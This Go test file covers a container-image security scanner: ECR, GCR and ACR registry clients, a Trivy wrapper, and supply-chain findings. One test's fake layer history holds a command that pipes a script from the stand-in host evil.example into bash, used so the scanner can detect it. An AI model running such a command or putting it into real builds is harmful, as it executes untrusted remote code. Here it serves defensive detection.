package scanner

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ecr"
	ecrtypes "github.com/aws/aws-sdk-go-v2/service/ecr/types"
)

type stubECR struct {
	describeRepositoriesFn      func(*ecr.DescribeRepositoriesInput) (*ecr.DescribeRepositoriesOutput, error)
	describeImagesFn            func(*ecr.DescribeImagesInput) (*ecr.DescribeImagesOutput, error)
	batchGetImageFn             func(*ecr.BatchGetImageInput) (*ecr.BatchGetImageOutput, error)
	describeImageScanFindingsFn func(*ecr.DescribeImageScanFindingsInput) (*ecr.DescribeImageScanFindingsOutput, error)
}

type stubRegistry struct {
	name     string
	manifest *ImageManifest
	vulns    []ImageVulnerability
	vulnErr  error
}

type stubSignedRegistry struct {
	*stubRegistry
	signature    *SignatureVerification
	signatureErr error
}

func (s *stubRegistry) Name() string { return s.name }

func (s *stubRegistry) RegistryHost() string { return "stub.registry.io" }

func (s *stubRegistry) QualifyImageRef(repo, tag string) string {
	return fmt.Sprintf("%s/%s:%s", s.RegistryHost(), repo, tag)
}

func (s *stubRegistry) ListRepositories(context.Context) ([]Repository, error) {
	return nil, nil
}

func (s *stubRegistry) ListTags(context.Context, string) ([]ImageTag, error) {
	return nil, nil
}

func (s *stubRegistry) GetManifest(context.Context, string, string) (*ImageManifest, error) {
	if s.manifest == nil {
		return nil, errors.New("manifest not configured")
	}
	return s.manifest, nil
}

func (s *stubRegistry) GetVulnerabilities(context.Context, string, string) ([]ImageVulnerability, error) {
	if s.vulnErr != nil {
		return nil, s.vulnErr
	}
	return s.vulns, nil
}

func (s *stubSignedRegistry) VerifySignature(_ context.Context, _ string, _ string, _ *ImageManifest) (*SignatureVerification, error) {
	if s.signatureErr != nil {
		return nil, s.signatureErr
	}
	return s.signature, nil
}

type stubImageScanner struct {
	result *ContainerScanResult
	err    error
}

func (s *stubImageScanner) ScanImage(context.Context, string) (*ContainerScanResult, error) {
	if s.err != nil {
		return nil, s.err
	}
	return s.result, nil
}

type captureRefImageScanner struct {
	result  *ContainerScanResult
	err     error
	lastRef string
}

func (s *captureRefImageScanner) ScanImage(_ context.Context, imageRef string) (*ContainerScanResult, error) {
	s.lastRef = imageRef
	if s.err != nil {
		return nil, s.err
	}
	return s.result, nil
}

func (s *stubECR) DescribeRepositories(_ context.Context, params *ecr.DescribeRepositoriesInput, _ ...func(*ecr.Options)) (*ecr.DescribeRepositoriesOutput, error) {
	if s.describeRepositoriesFn == nil {
		return nil, errors.New("DescribeRepositories not configured")
	}
	return s.describeRepositoriesFn(params)
}

func (s *stubECR) DescribeImages(_ context.Context, params *ecr.DescribeImagesInput, _ ...func(*ecr.Options)) (*ecr.DescribeImagesOutput, error) {
	if s.describeImagesFn == nil {
		return nil, errors.New("DescribeImages not configured")
	}
	return s.describeImagesFn(params)
}

func (s *stubECR) BatchGetImage(_ context.Context, params *ecr.BatchGetImageInput, _ ...func(*ecr.Options)) (*ecr.BatchGetImageOutput, error) {
	if s.batchGetImageFn == nil {
		return nil, errors.New("BatchGetImage not configured")
	}
	return s.batchGetImageFn(params)
}

func (s *stubECR) DescribeImageScanFindings(_ context.Context, params *ecr.DescribeImageScanFindingsInput, _ ...func(*ecr.Options)) (*ecr.DescribeImageScanFindingsOutput, error) {
	if s.describeImageScanFindingsFn == nil {
		return nil, errors.New("DescribeImageScanFindings not configured")
	}
	return s.describeImageScanFindingsFn(params)
}

func TestECRClientSuccess(t *testing.T) {
	now := time.Now()
	manifestPayload := registryManifest{
		MediaType: "application/vnd.docker.distribution.manifest.v2+json",
		Layers: []struct {
			MediaType string `json:"mediaType"`
			Digest    string `json:"digest"`
			Size      int64  `json:"size"`
		}{
			{MediaType: "application/vnd.docker.image.rootfs.diff.tar.gzip", Digest: "sha256:layer", Size: 42},
		},
	}
	manifestBytes, err := json.Marshal(manifestPayload)
	if err != nil {
		t.Fatalf("marshal manifest: %v", err)
	}

	stub := &stubECR{
		describeRepositoriesFn: func(_ *ecr.DescribeRepositoriesInput) (*ecr.DescribeRepositoriesOutput, error) {
			return &ecr.DescribeRepositoriesOutput{
				Repositories: []ecrtypes.Repository{{
					RepositoryName: aws.String("repo"),
					RepositoryUri:  aws.String("uri"),
					CreatedAt:      aws.Time(now),
				}},
			}, nil
		},
		describeImagesFn: func(_ *ecr.DescribeImagesInput) (*ecr.DescribeImagesOutput, error) {
			return &ecr.DescribeImagesOutput{
				ImageDetails: []ecrtypes.ImageDetail{{
					ImageTags:        []string{"latest"},
					ImageDigest:      aws.String("sha256:abc"),
					ImagePushedAt:    aws.Time(now),
					ImageSizeInBytes: aws.Int64(12),
				}},
			}, nil
		},
		batchGetImageFn: func(_ *ecr.BatchGetImageInput) (*ecr.BatchGetImageOutput, error) {
			manifest := string(manifestBytes)
			return &ecr.BatchGetImageOutput{
				Images: []ecrtypes.Image{{
					ImageId:                &ecrtypes.ImageIdentifier{ImageDigest: aws.String("sha256:abc")},
					ImageManifest:          &manifest,
					ImageManifestMediaType: aws.String("application/vnd.docker.distribution.manifest.v2+json"),
				}},
			}, nil
		},
		describeImageScanFindingsFn: func(_ *ecr.DescribeImageScanFindingsInput) (*ecr.DescribeImageScanFindingsOutput, error) {
			return &ecr.DescribeImageScanFindingsOutput{
				ImageScanFindings: &ecrtypes.ImageScanFindings{
					Findings: []ecrtypes.ImageScanFinding{{
						Name:        aws.String("CVE-123"),
						Severity:    ecrtypes.FindingSeverityHigh,
						Description: aws.String("desc"),
						Uri:         aws.String("https://example.com"),
						Attributes: []ecrtypes.Attribute{
							{Key: aws.String("package_name"), Value: aws.String("openssl")},
							{Key: aws.String("package_version"), Value: aws.String("1.0")},
							{Key: aws.String("fixed_version"), Value: aws.String("1.1")},
						},
					}},
				},
			}, nil
		},
	}

	client := NewECRClientWithAPI("us-west-2", "", stub)
	ctx := context.Background()

	repos, err := client.ListRepositories(ctx)
	if err != nil {
		t.Fatalf("ListRepositories: %v", err)
	}
	if len(repos) != 1 || repos[0].Name != "repo" {
		t.Fatalf("unexpected repositories: %#v", repos)
	}

	tags, err := client.ListTags(ctx, "repo")
	if err != nil {
		t.Fatalf("ListTags: %v", err)
	}
	if len(tags) != 1 || tags[0].Name != "latest" {
		t.Fatalf("unexpected tags: %#v", tags)
	}

	manifest, err := client.GetManifest(ctx, "repo", "latest")
	if err != nil {
		t.Fatalf("GetManifest: %v", err)
	}
	if manifest.Digest != "sha256:abc" {
		t.Fatalf("unexpected digest: %s", manifest.Digest)
	}

	vulns, err := client.GetVulnerabilities(ctx, "repo", "latest")
	if err != nil {
		t.Fatalf("GetVulnerabilities: %v", err)
	}
	if len(vulns) != 1 || vulns[0].Package != "openssl" {
		t.Fatalf("unexpected vulnerabilities: %#v", vulns)
	}
}

func TestECRClientGetManifest_ParseError(t *testing.T) {
	manifestParseFailures.Store(0)

	stub := &stubECR{
		batchGetImageFn: func(_ *ecr.BatchGetImageInput) (*ecr.BatchGetImageOutput, error) {
			invalidManifest := "{invalid-json"
			return &ecr.BatchGetImageOutput{
				Images: []ecrtypes.Image{{
					ImageId:       &ecrtypes.ImageIdentifier{ImageDigest: aws.String("sha256:bad")},
					ImageManifest: &invalidManifest,
				}},
			}, nil
		},
	}

	client := NewECRClientWithAPI("us-west-2", "", stub)
	_, err := client.GetManifest(context.Background(), "repo", "latest")
	if err == nil {
		t.Fatal("expected parse manifest error")
	}
	if !strings.Contains(err.Error(), "parse manifest") {
		t.Fatalf("expected parse manifest context, got %v", err)
	}
	if got := ManifestParseFailures(); got != 1 {
		t.Fatalf("expected 1 manifest parse failure, got %d", got)
	}
}

func TestECRClient_QualifyImageRef(t *testing.T) {
	client := NewECRClientWithAPI("us-west-2", "123456789012", &stubECR{})
	ref := client.QualifyImageRef("myapp", "latest")
	expected := "123456789012.dkr.ecr.us-west-2.amazonaws.com/myapp:latest"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestECRClientListRepositoriesError(t *testing.T) {
	stub := &stubECR{
		describeRepositoriesFn: func(_ *ecr.DescribeRepositoriesInput) (*ecr.DescribeRepositoriesOutput, error) {
			return nil, errors.New("boom")
		},
	}
	client := NewECRClientWithAPI("us-west-2", "", stub)
	_, err := client.ListRepositories(context.Background())
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestContainerScannerFallback(t *testing.T) {
	registry := &stubRegistry{
		name: "stub",
		manifest: &ImageManifest{
			Digest: "sha256:abc",
			Config: ImageConfig{OS: "linux", Architecture: "amd64"},
		},
		vulnErr: errors.New("registry down"),
	}
	local := &stubImageScanner{
		result: &ContainerScanResult{
			Vulnerabilities: []ImageVulnerability{{CVE: "CVE-1", Severity: "high"}},
		},
	}

	scanner := NewContainerScanner()
	scanner.RegisterRegistry(registry)
	scanner.SetFallbackScanner(local)

	result, err := scanner.ScanImage(context.Background(), "stub", "repo", "latest")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}
	if result.Summary.High != 1 {
		t.Fatalf("expected high summary count, got %d", result.Summary.High)
	}
}

func TestContainerScannerFallback_UsesQualifiedRef(t *testing.T) {
	registry := &stubRegistry{
		name: "stub",
		manifest: &ImageManifest{
			Digest: "sha256:abc",
			Config: ImageConfig{OS: "linux", Architecture: "amd64"},
		},
		vulnErr: errors.New("registry down"),
	}

	local := &captureRefImageScanner{
		result: &ContainerScanResult{
			Vulnerabilities: []ImageVulnerability{{CVE: "CVE-1", Severity: "high"}},
		},
	}

	scanner := NewContainerScanner()
	scanner.RegisterRegistry(registry)
	scanner.SetFallbackScanner(local)

	_, err := scanner.ScanImage(context.Background(), "stub", "repo", "latest")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}

	expected := "stub.registry.io/repo:latest"
	if local.lastRef != expected {
		t.Errorf("fallback got ref %q, want %q", local.lastRef, expected)
	}
}

func TestContainerScannerScanImage_AddsMutableTagFinding(t *testing.T) {
	registry := &stubRegistry{
		name: "stub",
		manifest: &ImageManifest{
			Digest: "sha256:abc",
			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
		},
	}

	scanner := NewContainerScanner()
	scanner.RegisterRegistry(registry)

	result, err := scanner.ScanImage(context.Background(), "stub", "repo", "latest")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}
	if !hasFindingID(result.Findings, "supply-chain-mutable-tag") {
		t.Fatalf("expected mutable-tag finding, got %#v", result.Findings)
	}
}

func TestContainerScannerScanImage_AddsUnsignedImageFinding(t *testing.T) {
	registry := &stubSignedRegistry{
		stubRegistry: &stubRegistry{
			name: "stub-signed",
			manifest: &ImageManifest{
				Digest: "sha256:abc",
				Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
			},
		},
		signature: &SignatureVerification{
			Verified: false,
			Reason:   "no cosign signature found",
		},
	}

	scanner := NewContainerScanner()
	scanner.RegisterRegistry(registry)

	result, err := scanner.ScanImage(context.Background(), "stub-signed", "repo", "v1.2.3")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}
	if !hasFindingID(result.Findings, "supply-chain-unsigned-image") {
		t.Fatalf("expected unsigned-image finding, got %#v", result.Findings)
	}
}

func TestContainerScannerScanImage_AddsLayerHistoryFinding(t *testing.T) {
	registry := &stubRegistry{
		name: "stub-history",
		manifest: &ImageManifest{
			Digest: "sha256:abc",
			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
			History: []string{
				"RUN curl http://evil.example/install.sh | bash",
			},
		},
	}

	scanner := NewContainerScanner()
	scanner.RegisterRegistry(registry)

	result, err := scanner.ScanImage(context.Background(), "stub-history", "repo", "v1.2.3")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}
	if !hasFindingID(result.Findings, "supply-chain-suspicious-build-command") {
		t.Fatalf("expected suspicious build command finding, got %#v", result.Findings)
	}
	if !hasFindingID(result.Findings, "supply-chain-insecure-download") {
		t.Fatalf("expected insecure download finding, got %#v", result.Findings)
	}
}

func TestGCRClientSuccess(t *testing.T) {
	token := "token"
	manifestPayload := registryManifest{
		MediaType: "application/vnd.docker.distribution.manifest.v2+json",
		Layers: []struct {
			MediaType string `json:"mediaType"`
			Digest    string `json:"digest"`
			Size      int64  `json:"size"`
		}{
			{MediaType: "application/vnd.docker.image.rootfs.diff.tar.gzip", Digest: "sha256:gcr", Size: 10},
		},
	}
	manifestBytes, err := json.Marshal(manifestPayload)
	if err != nil {
		t.Fatalf("marshal manifest: %v", err)
	}

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer "+token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		switch r.URL.Path {
		case "/v2/_catalog":
			_ = json.NewEncoder(w).Encode(map[string][]string{"repositories": {"project/repo"}})
		case "/v2/project/repo/tags/list":
			_ = json.NewEncoder(w).Encode(map[string][]string{"tags": {"latest"}})
		case "/v2/project/repo/manifests/latest":
			w.Header().Set("Docker-Content-Digest", "sha256:gcr")
			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
			_, _ = w.Write(manifestBytes)
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	client := NewGCRClient("project")
	client.SetAccessToken(token)
	client.SetRegistryHost(server.URL)
	client.client = server.Client()

	repos, err := client.ListRepositories(context.Background())
	if err != nil {
		t.Fatalf("ListRepositories: %v", err)
	}
	if len(repos) != 1 || repos[0].Name != "repo" {
		t.Fatalf("unexpected repositories: %#v", repos)
	}

	tags, err := client.ListTags(context.Background(), "repo")
	if err != nil {
		t.Fatalf("ListTags: %v", err)
	}
	if len(tags) != 1 || tags[0].Name != "latest" {
		t.Fatalf("unexpected tags: %#v", tags)
	}

	manifest, err := client.GetManifest(context.Background(), "repo", "latest")
	if err != nil {
		t.Fatalf("GetManifest: %v", err)
	}
	if manifest.Digest != "sha256:gcr" {
		t.Fatalf("unexpected digest: %s", manifest.Digest)
	}
}

func TestGCRClientGetManifest_ParseError(t *testing.T) {
	manifestParseFailures.Store(0)
	token := "token"

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer "+token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		switch r.URL.Path {
		case "/v2/project/repo/manifests/latest":
			w.Header().Set("Docker-Content-Digest", "sha256:gcr")
			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
			_, _ = w.Write([]byte("{invalid-json"))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	client := NewGCRClient("project")
	client.SetAccessToken(token)
	client.SetRegistryHost(server.URL)
	client.client = server.Client()

	_, err := client.GetManifest(context.Background(), "repo", "latest")
	if err == nil {
		t.Fatal("expected parse manifest error")
	}
	if !strings.Contains(err.Error(), "parse manifest") {
		t.Fatalf("expected parse manifest context, got %v", err)
	}
	if got := ManifestParseFailures(); got != 1 {
		t.Fatalf("expected 1 manifest parse failure, got %d", got)
	}
}

func TestGCRClient_QualifyImageRef(t *testing.T) {
	client := NewGCRClient("my-project")
	ref := client.QualifyImageRef("myapp", "v1.0")
	expected := "gcr.io/my-project/myapp:v1.0"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestGCRClient_QualifyImageRef_AlreadyQualified(t *testing.T) {
	client := NewGCRClient("my-project")
	ref := client.QualifyImageRef("my-project/myapp", "v1.0")
	expected := "gcr.io/my-project/myapp:v1.0"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestGCRClient_QualifyImageRef_HTTPSHost(t *testing.T) {
	client := NewGCRClient("my-project")
	client.SetRegistryHost("https://gcr.io")
	ref := client.QualifyImageRef("myapp", "v1.0")
	expected := "gcr.io/my-project/myapp:v1.0"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestGCRClient_QualifyImageRef_HTTPHost(t *testing.T) {
	client := NewGCRClient("my-project")
	client.SetRegistryHost("http://localhost:5000")
	ref := client.QualifyImageRef("myapp", "latest")
	expected := "localhost:5000/my-project/myapp:latest"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestGCRClient_RegistryHost_StripsScheme(t *testing.T) {
	client := NewGCRClient("proj")
	client.SetRegistryHost("https://us-docker.pkg.dev")
	if got := client.RegistryHost(); got != "us-docker.pkg.dev" {
		t.Errorf("RegistryHost() = %q, want %q", got, "us-docker.pkg.dev")
	}
}

func TestGCRClientListRepositoriesError(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte("boom"))
	}))
	defer server.Close()

	client := NewGCRClient("project")
	client.SetRegistryHost(server.URL)
	client.client = server.Client()
	_, err := client.ListRepositories(context.Background())
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestACRClientSuccess(t *testing.T) {
	manifestPayload := registryManifest{
		MediaType: "application/vnd.docker.distribution.manifest.v2+json",
		Layers: []struct {
			MediaType string `json:"mediaType"`
			Digest    string `json:"digest"`
			Size      int64  `json:"size"`
		}{
			{MediaType: "application/vnd.docker.image.rootfs.diff.tar.gzip", Digest: "sha256:acr", Size: 8},
		},
	}
	manifestBytes, err := json.Marshal(manifestPayload)
	if err != nil {
		t.Fatalf("marshal manifest: %v", err)
	}

	username := "user"
	password := "pass"
	expectedAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(username+":"+password))

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != expectedAuth {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		switch r.URL.Path {
		case "/v2/_catalog":
			_ = json.NewEncoder(w).Encode(map[string][]string{"repositories": {"repo"}})
		case "/v2/repo/tags/list":
			_ = json.NewEncoder(w).Encode(map[string][]string{"tags": {"latest"}})
		case "/v2/repo/manifests/latest":
			w.Header().Set("Docker-Content-Digest", "sha256:acr")
			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
			_, _ = w.Write(manifestBytes)
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	client := NewACRClient("registry", "")
	client.SetCredentials(username, password)
	client.SetBaseURL(server.URL)
	client.client = server.Client()

	repos, err := client.ListRepositories(context.Background())
	if err != nil {
		t.Fatalf("ListRepositories: %v", err)
	}
	if len(repos) != 1 || repos[0].Name != "repo" {
		t.Fatalf("unexpected repositories: %#v", repos)
	}

	tags, err := client.ListTags(context.Background(), "repo")
	if err != nil {
		t.Fatalf("ListTags: %v", err)
	}
	if len(tags) != 1 || tags[0].Name != "latest" {
		t.Fatalf("unexpected tags: %#v", tags)
	}

	manifest, err := client.GetManifest(context.Background(), "repo", "latest")
	if err != nil {
		t.Fatalf("GetManifest: %v", err)
	}
	if manifest.Digest != "sha256:acr" {
		t.Fatalf("unexpected digest: %s", manifest.Digest)
	}
}

func TestACRClientGetManifest_ParseError(t *testing.T) {
	manifestParseFailures.Store(0)
	username := "user"
	password := "pass"
	expectedAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(username+":"+password))

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != expectedAuth {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		switch r.URL.Path {
		case "/v2/repo/manifests/latest":
			w.Header().Set("Docker-Content-Digest", "sha256:acr")
			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
			_, _ = w.Write([]byte("{invalid-json"))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	client := NewACRClient("registry", "")
	client.SetCredentials(username, password)
	client.SetBaseURL(server.URL)
	client.client = server.Client()

	_, err := client.GetManifest(context.Background(), "repo", "latest")
	if err == nil {
		t.Fatal("expected parse manifest error")
	}
	if !strings.Contains(err.Error(), "parse manifest") {
		t.Fatalf("expected parse manifest context, got %v", err)
	}
	if got := ManifestParseFailures(); got != 1 {
		t.Fatalf("expected 1 manifest parse failure, got %d", got)
	}
}

func TestACRClient_QualifyImageRef(t *testing.T) {
	client := NewACRClient("myregistry", "sub-123")
	ref := client.QualifyImageRef("myapp", "latest")
	expected := "myregistry.azurecr.io/myapp:latest"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestACRClient_QualifyImageRef_BaseURLOverride(t *testing.T) {
	client := NewACRClient("myregistry", "sub-123")
	client.SetBaseURL("https://custom.registry.io")
	ref := client.QualifyImageRef("myapp", "latest")
	expected := "custom.registry.io/myapp:latest"
	if ref != expected {
		t.Errorf("got %q, want %q", ref, expected)
	}
}

func TestACRClientListRepositoriesError(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte("boom"))
	}))
	defer server.Close()

	client := NewACRClient("registry", "")
	client.SetBaseURL(server.URL)
	client.client = server.Client()
	_, err := client.ListRepositories(context.Background())
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestTrivyScanner(t *testing.T) {
	payload := `{"Results":[{"Target":"img","Vulnerabilities":[{"VulnerabilityID":"CVE-1","PkgName":"openssl","InstalledVersion":"1","FixedVersion":"2","Severity":"HIGH","Description":"desc","CVSS":{"nvd":{"V3Score":7.5}}}]}]}`
	script := "#!/bin/sh\nprintf '%s' '" + payload + "'\n"
	path := writeExecutable(t, script)

	scanner := NewTrivyScanner(path)
	result, err := scanner.ScanImage(context.Background(), "repo:tag")
	if err != nil {
		t.Fatalf("ScanImage: %v", err)
	}
	if result.Summary.High != 1 || len(result.Vulnerabilities) != 1 {
		t.Fatalf("unexpected result: %#v", result)
	}
}

func TestTrivyScannerError(t *testing.T) {
	script := "#!/bin/sh\necho boom >&2\nexit 1\n"
	path := writeExecutable(t, script)

	scanner := NewTrivyScanner(path)
	_, err := scanner.ScanImage(context.Background(), "repo:tag")
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestParseManifest_ExtractsHistoryCommands(t *testing.T) {
	raw := []byte(`{
		"mediaType":"application/vnd.docker.distribution.manifest.v1+json",
		"layers":[{"mediaType":"application/vnd.docker.image.rootfs.diff.tar.gzip","digest":"sha256:layer","size":123}],
		"history":[
			{"v1Compatibility":"{\"created_by\":\"RUN curl https://safe.example/install.sh | sh\"}"}
		]
	}`)

	manifest := &ImageManifest{}
	if err := parseManifest(raw, manifest); err != nil {
		t.Fatalf("parseManifest: %v", err)
	}
	if len(manifest.History) != 1 {
		t.Fatalf("expected 1 history command, got %d", len(manifest.History))
	}
	if !strings.Contains(manifest.History[0], "curl https://safe.example/install.sh | sh") {
		t.Fatalf("unexpected history command: %s", manifest.History[0])
	}
}

func hasFindingID(findings []ContainerFinding, id string) bool {
	for _, finding := range findings {
		if finding.ID == id {
			return true
		}
	}
	return false
}

func writeExecutable(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "trivy")
	if err := os.WriteFile(path, []byte(content), 0o700); err != nil {
		t.Fatalf("write file: %v", err)
	}
	return path
}
